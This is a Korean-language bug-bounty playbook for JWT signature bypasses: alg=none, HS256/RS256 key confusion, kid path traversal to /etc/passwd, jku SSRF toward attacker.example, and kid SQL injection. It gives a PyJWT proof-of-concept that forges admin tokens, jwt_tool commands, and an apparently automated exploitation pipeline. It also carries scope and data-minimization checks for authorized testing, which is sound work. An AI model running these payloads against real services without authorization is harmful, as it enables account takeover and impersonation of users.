# Scenario: JWT `kid` / `jku` / `alg` Confusion

> JWT 구현의 header 필드 처리 결함으로 인한 서명 우회. 2024-26에도 Node.js
> `jsonwebtoken`, PyJWT, jose 라이브러리 관련 CVE가 지속 발생.

## 1. Threat Model
- **타겟**: JWT 기반 인증/SSO — `alg=RS256/HS256/ES256`, `kid` 헤더로 키 조회
- **공격자**: unauthenticated (valid JWT 구조만 알면 됨)
- **Impact**: 임의 사용자 위조 → ATO → admin 승격 가능
- **VRT**: `broken_authentication.*.jwt`
- **CVSS anchor**: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N (9.1)

## 2. Discovery Signals
- `Authorization: Bearer eyJ...` 패턴
- JWT header에 `kid`, `jku`, `x5u`, `jwk` 필드 존재 여부
- 공개 JWKS endpoint: `/.well-known/jwks.json`
- 다중 알고리즘 지원 (legacy HS256 + RS256 혼재)
- `alg=none` 또는 empty signature 허용 여부

## 3. Exploit Chain

### Variant A — alg=none
```
JWT 전달 → decode → alg 필드가 "none"인 경우 signature 검증 skip
타겟이 여전히 "none" 허용 → payload 임의 변조 → user_id 교체
```

### Variant B — HS256 confusion with RS256 public key
```
RS256 공개키를 HMAC key로 재사용 → HS256 알고리즘으로 서명
라이브러리가 alg에 따라 key 타입 검증 없으면 통과
```

### Variant C — kid path traversal
```
kid 헤더가 파일 경로 조회 → "../../../dev/null" 또는 "../../etc/passwd"
→ 빈 파일 또는 예측 가능한 콘텐츠를 HMAC key로 사용
```

### Variant D — jku / x5u SSRF
```
jku 헤더는 JWKS URL → 공격자 통제 URL 지시
타겟이 jku fetch 후 그 키로 검증 → 공격자 키페어로 위조
```

### Variant E — kid SQL injection
```
kid 헤더가 DB 쿼리에 삽입 → UNION SELECT 로 임의 값 반환
→ 그 값이 HMAC secret으로 사용됨
```

## 4. PoC Template

```python
import jwt  # PyJWT
import json, base64

# Original token decoded
header = {"alg":"RS256","typ":"JWT","kid":"1"}
payload = {"sub":"victim-user-id","role":"admin","iat":0,"exp":9999999999}

# Variant A — alg=none
none_token = jwt.encode(payload, "", algorithm="none")
print(none_token)

# Variant B — HS256 with RSA public key
with open("target_public_key.pem","rb") as f:
    pub = f.read()
confused = jwt.encode(payload, pub, algorithm="HS256")

# Variant D — jku pointing to attacker
malicious_header = {"alg":"RS256","jku":"https://attacker.example/jwks.json","kid":"1"}
# 공격자 서버에 일치하는 JWKS 호스팅 필요 (openssl + script)

# Variant E — kid SQL injection payload
sqli_header = {"alg":"HS256","kid":"none' UNION SELECT 'AAAA'-- "}
# 이후 'AAAA'를 HMAC secret으로 사용해 서명
token = jwt.encode(payload, "AAAA", algorithm="HS256",
                    headers={"kid": sqli_header["kid"]})
```

```bash
# jwt_tool (https://github.com/ticarpi/jwt_tool)
jwt_tool $TOKEN -T  # tamper
jwt_tool $TOKEN -X a  # alg=none attack
jwt_tool $TOKEN -X k -pk target_pub.pem  # HS256 with RS public
jwt_tool $TOKEN -X s -ju https://attacker.example/jwks.json
```

## 5. Evidence Tier
- **E1**: 위조 token으로 타겟 프로덕션 API 호출 → victim 식별 응답 캡처 (victim 이메일, UUID) + victim에 해당하는 저장 데이터 return 확인
- **E2**: 위조 token이 `/me` 엔드포인트에서 victim 정보 return — 하지만 추가 action 확인 없음
- **E3**: Token 검증 우회만 확인 (401이 아닌 200), 실제 impersonation 결과 불명
- **E4**: alg=none 허용 정적 분석만

## 6. Gate 1 / Gate 2 체크
- [ ] **Feature check**: 일부 구현은 의도적으로 `kid` SSRF 허용 (legacy) — scope에 포함?
- [ ] **Recent patch**: PyJWT 2.8+, jsonwebtoken 9.0+ 기본값은 alg=none 차단 — 타겟 버전 확인
- [ ] **Live target check**: CDN/WAF (Cloudflare, Akamai) 앞단 필터링? 직접 origin 접근해야 할 수도
- [ ] **Scope**: `/.well-known/jwks.json` 변조 가능 여부 + jku 허용 여부가 프로그램 in-scope에 포함?
- [ ] **Data exfil minimization**: victim 계정 impersonation 확인 후 즉시 로그아웃/token revoke 요청

## 7. Variants / Chains
- **JWT kid → RCE** — `kid` 값이 `eval()`로 처리되는 극소수 custom 구현
- **JWT replay across services** — 같은 `aud` 필드를 여러 마이크로서비스가 공유
- **JWE alg=dir** — 암호화 JWT에서 key 재사용
- **Refresh token 영구성** — access token 취약점과 결합 시 persistent access
- **ES256 bit-flipping** — invalid curve attack (CVE-2022-21449 "Psychic Signature" 계열)

## 8. References
- RFC 7519 (JWT) / RFC 7515 (JWS) / RFC 7517 (JWK)
- PortSwigger — https://portswigger.net/web-security/jwt
- jwt_tool — https://github.com/ticarpi/jwt_tool
- auth0 — JWT 공격 해설 blog 시리즈
- 대표 CVE: CVE-2022-21449 (Java ECDSA), CVE-2024-34064 (jinja2 관련 간접), jsonwebtoken < 9.0 family
- HackerOne Top JWT writeups — 검색: "JWT" + "bypass"

## 관련 Terminator 파이프라인
- Phase 1 scout: 모든 Bearer 토큰 캡처 → `jwt_tokens.txt`
- Phase 2 exploiter: jwt_tool 자동화 스크립트 (5개 variant 순차 실행)
- Gate 1: "JWT 허용하는 대부분 프로그램" = feature → impact 명확해야 통과
